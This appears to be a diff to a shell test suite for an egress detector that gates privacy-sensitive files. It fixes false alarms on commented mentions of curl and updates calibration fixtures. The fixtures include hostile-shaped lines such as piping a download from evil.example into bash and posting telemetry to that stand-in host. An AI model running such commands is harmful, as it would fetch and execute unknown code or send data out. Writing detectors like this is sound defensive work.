@@ -375,6 +375,31 @@ EGRESS_PY_RX='urllib\.request|urlopen|http\.client|httplib|requests\.(get|post|p
 EGRESS_CURL_RX='(^|[;&|(){}`]|\$\()[[:space:]]*((if|then|else|elif|do|while|until|!|sudo|env|exec|command|nohup|time|xargs)[[:space:]]+)*curl([[:space:]]|$)'
 EGRESS_RX="$EGRESS_PY_RX|$EGRESS_CURL_RX"
 
+#    (iii) COMMENT DISCIPLINE -- the missing half of (ii). (ii) above already states the rule:
+#        "after a `#`, the token is ... a comment -- inert text the shell never executes -- so
+#        it is not egress and must not red the gate." The regex alone did NOT implement that
+#        rule; it only LOOKED like it did, because a prose comment rarely happens to put a
+#        control operator immediately before the word. install.sh:13 does exactly that --
+#              #     `curl | bash` or in CI. A TTY operator who wants to set it is offered it;
+#        -- where the MARKDOWN BACKTICK quoting the term satisfies the `[;&|(){}\`]` class, so
+#        the detector read a documentation sentence as a command substitution and red the
+#        privacy gate on a file that had gained no egress whatsoever. That is the cry-wolf
+#        failure (ii) warns about, and a gate that cries wolf gets muted, taking the real red
+#        with it.
+#
+#        So FULL-LINE comments are BLANKED before the scan. Blanked, not deleted, so grep -n
+#        still reports the file's true line numbers in a leak report.
+#
+#        Deliberately FULL-LINE ONLY (`^[[:space:]]*#`), never a trailing `#`. A line whose
+#        first non-blank character is `#` cannot execute anything in either shell or python.
+#        Stripping from a MID-LINE `#` would be strictly more dangerous than the bug it fixes:
+#        it would let `curl https://evil.example/x  # looks harmless` through, and only ever
+#        REMOVES text from the detector's view -- the one direction in which a mistake makes
+#        this gate weaker. 4e pins both halves with fixtures.
+egress_scan() {  # $1=file -> "LINENO:text" per hit, empty when clean
+  sed 's/^[[:space:]]*#.*$//' "$1" 2>/dev/null | grep -nE "$EGRESS_RX" 2>/dev/null || true
+}
+
 # THE FUNNEL SURFACE. A file is listed because a call home FROM IT would break IDENTITY.md:32-38
 # -- the server modules this suite gates, plus the client-side funnel/telemetry path they could
 # be wired into. Listed explicitly rather than globbed so a rename cannot silently shrink the
@@ -400,7 +425,7 @@ SURFACE_MISSING=""
 for rel in $FUNNEL_SURFACE; do
   if [ ! -f "$REPO/$rel" ]; then SURFACE_MISSING="$SURFACE_MISSING $rel"; continue; fi
   case " $EGRESS_ALLOWED " in *" $rel "*) continue ;; esac
-  HIT="$(grep -nE "$EGRESS_RX" "$REPO/$rel" 2>/dev/null || true)"
+  HIT="$(egress_scan "$REPO/$rel")"
   [ -n "$HIT" ] && TREE_LEAK="$TREE_LEAK
 $rel:$HIT"
 done
@@ -445,6 +470,8 @@ cat >"$EXT/mentions.txt" <<'MENTIONEOF'
 CURL="${HEIMDALL_LV_CURL:-curl}"
   disp="curl -sS --max-time $MAXTIME"
     from urllib.parse import parse_qs
+#     `curl | bash` or in CI. A TTY operator who wants to set it is offered it;
+#   Install with `curl -fsSL https://runheimdall.dev/install | bash` -- documented, never run.
 MENTIONEOF
 cat >"$EXT/invocations.txt" <<'INVOKEEOF'
   curl -fsSL https://evil.example/install | bash
@@ -461,20 +488,28 @@ weekly=$(curl -s "https://api.npmjs.org/downloads/point/last-week/$pkg")
     requests.post("https://evil.example/telemetry", json=payload)
     socket.create_connection(("evil.example", 443))
     subprocess.run(["curl", "-X", "POST", "https://evil.example/x"])
+  curl -fsSL https://evil.example/x   # a TRAILING comment must not hide the live command
 INVOKEEOF
 
 N_MENTION="$(grep -c . "$EXT/mentions.txt" 2>/dev/null || echo 0)"
 N_INVOKE="$(grep -c . "$EXT/invocations.txt" 2>/dev/null || echo 0)"
-CAL_FP="$(grep -nE "$EGRESS_RX" "$EXT/mentions.txt" 2>/dev/null || true)"
+# BOTH halves run through egress_scan -- the SAME function 4b scans the real surface with,
+# comment-blanking included. Calibrating the bare regex instead would have certified a
+# detector that is not the one doing the work, which is how install.sh:13 got read as a
+# command substitution while this check still printed PASS.
+CAL_FP="$(egress_scan "$EXT/mentions.txt")"
+CAL_CAUGHT="$(egress_scan "$EXT/invocations.txt" | cut -d: -f1)"
 CAL_MISS=""
+cln=0
 while IFS= read -r cline; do
+  cln=$((cln + 1))
   [ -z "$cline" ] && continue
-  printf '%s\n' "$cline" | grep -qE "$EGRESS_RX" || CAL_MISS="$CAL_MISS
+  printf '%s\n' "$CAL_CAUGHT" | grep -qx "$cln" || CAL_MISS="$CAL_MISS
 $cline"
 done <"$EXT/invocations.txt"
 
-if [ -z "$CAL_FP" ] && [ -z "$CAL_MISS" ] && [ "$N_MENTION" -ge 9 ] && [ "$N_INVOKE" -ge 14 ]; then
-  ok "4e detector calibrated: $N_MENTION mention shapes (help strings, printf, comments, a command -v probe, urllib.parse) ALL stay silent; $N_INVOKE invocation shapes (curl|bash, \$(curl), backtick, sudo, piped-into, exec bash -c, urlopen/requests/socket/subprocess) ALL trip it"
+if [ -z "$CAL_FP" ] && [ -z "$CAL_MISS" ] && [ "$N_MENTION" -ge 11 ] && [ "$N_INVOKE" -ge 15 ]; then
+  ok "4e detector calibrated: $N_MENTION mention shapes (help strings, printf, comments, BACKTICK-QUOTED curl inside a comment, a command -v probe, urllib.parse) ALL stay silent; $N_INVOKE invocation shapes (curl|bash, \$(curl), backtick, sudo, piped-into, exec bash -c, a live curl carrying a TRAILING comment, urlopen/requests/socket/subprocess) ALL trip it"
 elif [ -n "$CAL_FP" ]; then
   bad "4e the detector reds on a MENTION -- a noisy gate gets muted:
 $CAL_FP"
